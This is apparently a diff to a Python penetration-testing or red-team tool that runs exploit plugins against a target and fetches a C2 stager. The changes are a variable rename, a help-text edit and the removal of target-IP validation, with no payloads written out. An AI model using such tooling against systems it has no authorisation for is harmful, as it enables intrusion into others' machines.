@@ -42,8 +42,8 @@ def run_initial_access_plugin(plugin_name: str, plugin_config:list, target_ip: s
     """
     try:
         print('[+] Running plugin {}'.format(plugin_name))
-        rs = c2.get_stager(safe_get(plugin_config, 'OS'), token)
-        res = eval(plugin_name).exploit(target_ip, target_port, local_ip, local_port, rs)
+        stager = c2.get_stager(safe_get(plugin_config, 'OS'), token)
+        res = eval(plugin_name).exploit(target_ip, target_port, local_ip, local_port, stager)
         if res is True:
             print('[+] Exploit was successful !')
             if compromission_recap_file_name:
@@ -92,7 +92,7 @@ def main() -> None | str:
     parser.add_argument('-l', '--local_ip', type=str, help='local ip', required=False)
     parser.add_argument('-lp', '--local_port', default=9001, type=int, help='local port', required=False)
     parser.add_argument('-rp', '--remote_port', type=int, required=False)
-    parser.add_argument('-o', '--output', type=str, help='output report file name (.md format)', required=False)
+    parser.add_argument('-o', '--output', type=str, help='output report file name (markdown format)', required=False)
     parser.add_argument('-f', '--fast-scan', action='store_true', help='increase masscan\'s rate limit to 100000, be careful with this option it might flood the network', required=False)
     args = parser.parse_args()
 
@@ -103,7 +103,6 @@ def main() -> None | str:
         LOCAL_IP = args.local_ip
 
     # validate IP addresses' format
-    validate_ip_address(args.target_ip)
     validate_ip_address(LOCAL_IP)
     
     if args.remote_port:
